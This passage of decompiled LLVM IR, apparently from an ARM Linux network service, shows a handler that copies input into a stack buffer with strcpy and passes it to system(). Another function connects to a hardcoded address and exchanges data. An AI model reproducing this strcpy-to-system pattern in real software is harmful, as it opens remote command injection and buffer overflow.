  %7 = call i8* @strcpy(i8* nonnull %stack_var_-1016, i8* nonnull %6), !insn.addr !129
  store i32 1701670723, i32* %stack_var_-2080, align 4, !insn.addr !130
  %8 = bitcast i8** %stack_var_-1040 to i8*, !insn.addr !131
  %9 = call i32 @system(i8* nonnull %8), !insn.addr !131
  %10 = icmp eq i32 %9, -1, !insn.addr !132
  br i1 %10, label %dec_label_pc_10d74, label %dec_label_pc_10ce4, !insn.addr !133

dec_label_pc_10ce4:                               ; preds = %dec_label_pc_10c24
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_11358, i32 0, i32 0), i32 %9), !insn.addr !134
  %12 = urem i32 %9, 128, !insn.addr !135
  %13 = icmp eq i32 %12, 0, !insn.addr !135
  %14 = call i32 @__asm_ubfx(i32 %9, i32 8, i32 8), !insn.addr !136
  br i1 %13, label %dec_label_pc_10d04, label %dec_label_pc_10ce4.dec_label_pc_10d4c_crit_edge, !insn.addr !137

dec_label_pc_10ce4.dec_label_pc_10d4c_crit_edge:  ; preds = %dec_label_pc_10ce4
  %.pre = bitcast i32* %stack_var_-2080 to i8*, !insn.addr !138
  store i8* %.pre, i8** %.pre-phi.reg2mem
  store i32 %14, i32* %r6.1.reg2mem
  br label %dec_label_pc_10d4c

dec_label_pc_10d04:                               ; preds = %dec_label_pc_10ce4
  %15 = icmp eq i32 %14, 0, !insn.addr !139
  br i1 %15, label %dec_label_pc_10d0c, label %dec_label_pc_10d90, !insn.addr !140

dec_label_pc_10d0c:                               ; preds = %dec_label_pc_10d04
  %16 = call i32 @puts(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_11370, i32 0, i32 0)), !insn.addr !141
  store i32 3158066, i32* %stack_var_-2080, align 4, !insn.addr !142
  store i32 0, i32* %r6.0.reg2mem, !insn.addr !142
  br label %dec_label_pc_10d24, !insn.addr !142

dec_label_pc_10d24:                               ; preds = %dec_label_pc_10d90, %dec_label_pc_10d74, %dec_label_pc_10d4c, %dec_label_pc_10d0c
  %r6.0.reload = load i32, i32* %r6.0.reg2mem
  %17 = bitcast i32* %stack_var_-2080 to i8*
  %18 = call i32 @strlen(i8* nonnull %17), !insn.addr !143
  %19 = add i32 %18, 1, !insn.addr !144
  %20 = call i32 @write(i32 %2, i32* nonnull %stack_var_-2080, i32 %19), !insn.addr !145
  %21 = call i32 @close(i32 %2), !insn.addr !146
  call void @pthread_exit(i32* null), !insn.addr !147
  store i8* %17, i8** %.pre-phi.reg2mem, !insn.addr !147
  store i32 %r6.0.reload, i32* %r6.1.reg2mem, !insn.addr !147
  br label %dec_label_pc_10d4c, !insn.addr !147

dec_label_pc_10d4c:                               ; preds = %dec_label_pc_10ce4.dec_label_pc_10d4c_crit_edge, %dec_label_pc_10d24
  %r6.1.reload = load i32, i32* %r6.1.reg2mem
  %.pre-phi.reload = load i8*, i8** %.pre-phi.reg2mem
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_113b0, i32 0, i32 0), i32 %r6.1.reload), !insn.addr !148
  %23 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %.pre-phi.reload, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_113c8, i32 0, i32 0), i32 %r6.1.reload), !insn.addr !138
  store i32 %r6.1.reload, i32* %r6.0.reg2mem, !insn.addr !149
  br label %dec_label_pc_10d24, !insn.addr !149

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10c24
  %24 = call i32 @puts(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_11348, i32 0, i32 0)), !insn.addr !150
  store i32 3158069, i32* %stack_var_-2080, align 4, !insn.addr !151
  br label %dec_label_pc_10d24, !insn.addr !152

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d04
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1138c, i32 0, i32 0), i32 %14), !insn.addr !153
  %26 = bitcast i32* %stack_var_-2080 to i8*, !insn.addr !154
  %27 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %26, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_113ac, i32 0, i32 0), i32 %14), !insn.addr !154
  store i32 %14, i32* %r6.0.reg2mem, !insn.addr !155
  br label %dec_label_pc_10d24, !insn.addr !155

; uselistorder directives
  uselistorder i32 %r6.1.reload, { 2, 0, 1 }
  uselistorder i32 %14, { 1, 3, 2, 4, 0 }
  uselistorder i32 %9, { 1, 0, 2, 3 }
  uselistorder i32 %2, { 1, 0, 2 }
  uselistorder i32* %stack_var_-2080, { 1, 4, 2, 3, 5, 0, 6 }
  uselistorder i32* %stack_var_-2064, { 1, 0, 2, 3 }
  uselistorder i8** %stack_var_-1040, { 1, 0 }
  uselistorder i8* %stack_var_-1016, { 1, 0 }
  uselistorder i32* %r6.0.reg2mem, { 1, 3, 0, 2 }
  uselistorder i32 (i8*, i8*, ...)* @sprintf, { 1, 0, 2 }
  uselistorder i32 (i8*, ...)* @printf, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 (i8*)* @puts, { 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_10d4c, { 1, 0 }
}

define i32 @function_10db8(i32 %arg1) local_unnamed_addr {
dec_label_pc_10db8:
  %r0.0.reg2mem = alloca i32, !insn.addr !156
  %stack_var_-1040 = alloca i32, align 4
  %stack_var_-1036 = alloca i32, align 4
  %stack_var_-1056 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = icmp eq i32 %arg1, 0, !insn.addr !157
  store i32 -3, i32* %r0.0.reg2mem, !insn.addr !158
  br i1 %0, label %dec_label_pc_10e98, label %dec_label_pc_10dc8, !insn.addr !158

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10db8
  store i32 2, i32* %stack_var_-1056, align 4, !insn.addr !159
  %1 = call i32 @inet_addr(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_113dc, i32 0, i32 0)), !insn.addr !160
  %2 = call i32 @function_10bd8(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_113e8, i32 0, i32 0)), !insn.addr !161
  %3 = call i32 @socket(i32 2, i32 1, i32 0), !insn.addr !162
  %4 = icmp slt i32 %3, 0, !insn.addr !163
  br i1 %4, label %dec_label_pc_10ea8, label %dec_label_pc_10e1c, !insn.addr !164

dec_label_pc_10e1c:                               ; preds = %dec_label_pc_10dc8
  %5 = bitcast i32* %stack_var_-1056 to %sockaddr*, !insn.addr !165
  %6 = call i32 @connect(i32 %3, %sockaddr* nonnull %5, i32 16), !insn.addr !165
  %7 = icmp slt i32 %6, 0, !insn.addr !166
  br i1 %7, label %dec_label_pc_10ebc, label %dec_label_pc_10e30, !insn.addr !167

dec_label_pc_10e30:                               ; preds = %dec_label_pc_10e1c
  %8 = inttoptr i32 %arg1 to i8*, !insn.addr !168
  %9 = call i32 @strlen(i8* %8), !insn.addr !168
  %10 = add i32 %9, 1, !insn.addr !169
  %11 = inttoptr i32 %arg1 to i32*, !insn.addr !170
  %12 = call i32 @send(i32 %3, i32* %11, i32 %10, i32 0), !insn.addr !170
  store i32 0, i32* %stack_var_-1040, align 4, !insn.addr !171
  %13 = call i32* @memset(i32* nonnull %stack_var_-1036, i32 0, i32 1020), !insn.addr !172
  %14 = call i32 @recv(i32 %3, i32* nonnull %stack_var_-1040, i32 1024, i32 0), !insn.addr !173
  %15 = icmp slt i32 %14, 1, !insn.addr !174
  store i32 -3, i32* %r0.0.reg2mem, !insn.addr !174
  br i1 %15, label %dec_label_pc_10e98, label %dec_label_pc_10e7c, !insn.addr !174

dec_label_pc_10e7c:                               ; preds = %dec_label_pc_10e30
  %16 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !175
  %17 = add i32 %16, -1024, !insn.addr !176
  %18 = add i32 %17, %14, !insn.addr !177
  %19 = inttoptr i32 %18 to i8*, !insn.addr !177
  store i8 0, i8* %19, align 1, !insn.addr !177
  %20 = bitcast i32* %stack_var_-1040 to i8*, !insn.addr !178
  %21 = call i32 @function_10bd8(i8* nonnull %20), !insn.addr !178
  %22 = icmp eq i32 %21, 200, !insn.addr !179
  %spec.store.select = select i1 %22, i32 0, i32 %21
  store i32 %spec.store.select, i32* %r0.0.reg2mem
  br label %dec_label_pc_10e98

dec_label_pc_10e98:                               ; preds = %dec_label_pc_10db8, %dec_label_pc_10e30, %dec_label_pc_10e7c, %dec_label_pc_10ebc, %dec_label_pc_10ea8
  %r0.0.reload = load i32, i32* %r0.0.reg2mem
  ret i32 %r0.0.reload, !insn.addr !180

dec_label_pc_10ea8:                               ; preds = %dec_label_pc_10dc8
  call void @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_113f0, i32 0, i32 0)), !insn.addr !181
  store i32 -1, i32* %r0.0.reg2mem, !insn.addr !182
  br label %dec_label_pc_10e98, !insn.addr !182

dec_label_pc_10ebc:                               ; preds = %dec_label_pc_10e1c
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_113fc, i32 0, i32 0)), !insn.addr !183
  store i32 -2, i32* %r0.0.reg2mem, !insn.addr !184
  br label %dec_label_pc_10e98, !insn.addr !184

; uselistorder directives
  uselistorder i32 %3, { 1, 0, 2, 3 }
  uselistorder i32* %r0.0.reg2mem, { 4, 5, 0, 3, 2, 1 }
  uselistorder i32 -1, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder void (i8*)* @perror, { 1, 0, 2 }
  uselistorder i8 0, { 1, 2, 0, 3, 4 }
  uselistorder i32* (i32*, i32, i32)* @memset, { 0, 2, 1, 3 }
  uselistorder i32 (i8*)* @strlen, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 0, 2 }
  uselistorder i32 (i8*)* @function_10bd8, { 2, 1, 0 }
  uselistorder i32 (i8*)* @inet_addr, { 1, 0, 2 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10e98, { 3, 4, 2, 1, 0 }
}

define i32 @function_10ed0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10ed0:
  %0 = call i32 @function_1074c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4), !insn.addr !185
  %spec.select = select i1 icmp eq (i32 ashr (i32 sub (i32 add (i32 ptrtoint (i32* @global_var_1102a to i32), i32 69344), i32 ptrtoint (i32* @global_var_21f08 to i32)), i32 2), i32 0), i32 %0, i32 %arg1
  ret i32 %spec.select, !insn.addr !186

; uselistorder directives
  uselistorder i32 2, { 0, 2, 1, 3 }
  uselistorder i32 0, { 12, 15, 16, 13, 14, 11, 7, 9, 10, 8, 67, 68, 57, 69, 19, 20, 21, 22, 17, 18, 23, 24, 25, 26, 0, 27, 28, 63, 64, 29, 30, 58, 31, 32, 59, 60, 33, 34, 65, 66, 2, 70, 37, 38, 39, 40, 41, 42, 43, 44, 35, 36, 1, 45, 46, 3, 4, 5, 6, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 61, 62 }
}

define i32 @function_10f0c() local_unnamed_addr {
dec_label_pc_10f0c:
  %0 = alloca i32
  %1 = load i32, i32* %0
  ret i32 %1, !insn.addr !187

; uselistorder directives
  uselistorder i32 1, { 3, 17, 44, 20, 32, 31, 30, 29, 6, 43, 36, 35, 34, 19, 18, 33, 9, 8, 7, 45, 12, 11, 10, 2, 13, 16, 14, 5, 4, 1, 0, 37, 21, 22, 23, 24, 25, 26, 27, 28, 42, 41, 40, 39, 38, 15 }
}

define i32 @function_10f10(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10f10:
  ret i32 %arg1, !insn.addr !188
}

declare i8* @strstr(i8*, i8*) local_unnamed_addr

declare i32 @printf(i8*, ...) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare void @perror(i8*) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @fwrite(i32*, i32, i32, %_IO_FILE*) local_unnamed_addr

declare i8* @strcpy(i8*, i8*) local_unnamed_addr

declare i32 @pthread_create(i32*, i32*, i32* (i32*)*, i32*) local_unnamed_addr

declare i32 @puts(i8*) local_unnamed_addr

declare i32 @__libc_start_main(i32, i32, i8**, void ()*, void ()*, void ()*) local_unnamed_addr

declare i32 @system(i8*) local_unnamed_addr

declare void @__gmon_start__() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @strlen(i8*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32* @memset(i32*, i32, i32) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare void @pthread_exit(i32*) local_unnamed_addr

declare i32 @shutdown(i32, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @sprintf(i8*, i8*, ...) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @inet_addr(i8*) local_unnamed_addr

declare void @abort() local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare void @__assert_fail(i8*, i8*, i32, i8*) local_unnamed_addr

declare void @__asm_svclt(i32) local_unnamed_addr

declare double @__asm_vqrshl.s8(double, double) local_unnamed_addr

declare i32 @__asm_ubfx(i32, i32, i32) local_unnamed_addr

!0 = !{i64 67408}
!1 = !{i64 67412}
!2 = !{i64 67444}
!3 = !{i64 67456}
!4 = !{i64 67468}
!5 = !{i64 67480}
!6 = !{i64 67492}
!7 = !{i64 67504}
!8 = !{i64 67516}
!9 = !{i64 67528}
!10 = !{i64 67540}
!11 = !{i64 67552}
!12 = !{i64 67564}
!13 = !{i64 67576}
!14 = !{i64 67588}
!15 = !{i64 67600}
!16 = !{i64 67612}
!17 = !{i64 67624}
!18 = !{i64 67636}
!19 = !{i64 67648}
!20 = !{i64 67660}
!21 = !{i64 67672}
!22 = !{i64 67684}
!23 = !{i64 67696}
!24 = !{i64 67708}
!25 = !{i64 67720}
!26 = !{i64 67732}
!27 = !{i64 67744}
!28 = !{i64 67756}
!29 = !{i64 67768}
!30 = !{i64 67780}
!31 = !{i64 67784}
!32 = !{i64 67812}
!33 = !{i64 67816}
!34 = !{i64 67820}
!35 = !{i64 67836}
!36 = !{i64 67840}
!37 = !{i64 67844}
!38 = !{i64 67860}
!39 = !{i64 67864}
!40 = !{i64 67872}
!41 = !{i64 67888}
!42 = !{i64 67908}
!43 = !{i64 67924}
!44 = !{i64 67944}
!45 = !{i64 67964}
!46 = !{i64 67968}
!47 = !{i64 67972}
!48 = !{i64 67984}
!49 = !{i64 67988}
!50 = !{i64 67992}
!51 = !{i64 68032}
!52 = !{i64 68052}
!53 = !{i64 68056}
!54 = !{i64 68060}
!55 = !{i64 68064}
!56 = !{i64 68068}
!57 = !{i64 68076}
!58 = !{i64 68096}
!59 = !{i64 68100}
!60 = !{i64 68104}
!61 = !{i64 68112}
!62 = !{i64 68128}
!63 = !{i64 68140}
!64 = !{i64 68144}
!65 = !{i64 68148}
!66 = !{i64 68160}
!67 = !{i64 68164}
!68 = !{i64 68172}
!69 = !{i64 68176}
!70 = !{i64 68180}
!71 = !{i64 68184}
!72 = !{i64 68192}
!73 = !{i64 68208}
!74 = !{i64 68212}
!75 = !{i64 68224}
!76 = !{i64 68232}
!77 = !{i64 68260}
!78 = !{i64 68288}
!79 = !{i64 68308}
!80 = !{i64 68320}
!81 = !{i64 68328}
!82 = !{i64 68348}
!83 = !{i64 68360}
!84 = !{i64 68368}
!85 = !{i64 68404}
!86 = !{i64 68408}
!87 = !{i64 68414}
!88 = !{i64 68436}
!89 = !{i64 68440}
!90 = !{i64 68444}
!91 = !{i64 68448}
!92 = !{i64 68460}
!93 = !{i64 68492}
!94 = !{i64 68516}
!95 = !{i64 68512}
!96 = !{i64 68524}
!97 = !{i64 68536}
!98 = !{i64 68540}
!99 = !{i64 68544}
!100 = !{i64 68546}
!101 = !{i64 68550}
!102 = !{i64 68552}
!103 = !{i64 68554}
!104 = !{i64 68560}
!105 = !{i64 68562}
!106 = !{i64 68564}
!107 = !{i64 68568}
!108 = !{i64 68576}
!109 = !{i64 68580}
!110 = !{i64 68588}
!111 = !{i64 68620}
!112 = !{i64 68628}
!113 = !{i64 68604}
!114 = !{i64 68608}
!115 = !{i64 68616}
!116 = !{i64 68624}
!117 = !{i64 68632}
!118 = !{i64 68636}
!119 = !{i64 68640}
!120 = !{i64 68644}
!121 = !{i64 68668}
!122 = !{i64 68684}
!123 = !{i64 68688}
!124 = !{i64 68708}
!125 = !{i64 68724}
!126 = !{i64 68744}
!127 = !{i64 68760}
!128 = !{i64 68776}
!129 = !{i64 68792}
!130 = !{i64 68812}
!131 = !{i64 68824}
!132 = !{i64 68828}
!133 = !{i64 68832}
!134 = !{i64 68852}
!135 = !{i64 68856}
!136 = !{i64 68860}
!137 = !{i64 68864}
!138 = !{i64 68972}
!139 = !{i64 68868}
!140 = !{i64 68872}
!141 = !{i64 68884}
!142 = !{i64 68896}
!143 = !{i64 68904}
!144 = !{i64 68912}
!145 = !{i64 68920}
!146 = !{i64 68928}
!147 = !{i64 68936}
!148 = !{i64 68952}
!149 = !{i64 68976}
!150 = !{i64 68988}
!151 = !{i64 69000}
!152 = !{i64 69004}
!153 = !{i64 69020}
!154 = !{i64 69040}
!155 = !{i64 69044}
!156 = !{i64 69048}
!157 = !{i64 69052}
!158 = !{i64 69060}
!159 = !{i64 69080}
!160 = !{i64 69100}
!161 = !{i64 69116}
!162 = !{i64 69136}
!163 = !{i64 69140}
!164 = !{i64 69144}
!165 = !{i64 69156}
!166 = !{i64 69160}
!167 = !{i64 69164}
!168 = !{i64 69172}
!169 = !{i64 69180}
!170 = !{i64 69192}
!171 = !{i64 69208}
!172 = !{i64 69212}
!173 = !{i64 69232}
!174 = !{i64 69240}
!175 = !{i64 69244}
!176 = !{i64 69248}
!177 = !{i64 69256}
!178 = !{i64 69260}
!179 = !{i64 69264}
!180 = !{i64 69276}
!181 = !{i64 69296}
!182 = !{i64 69304}
!183 = !{i64 69316}
!184 = !{i64 69324}
!185 = !{i64 69344}
!186 = !{i64 69376}
!187 = !{i64 69388}
!188 = !{i64 69396}
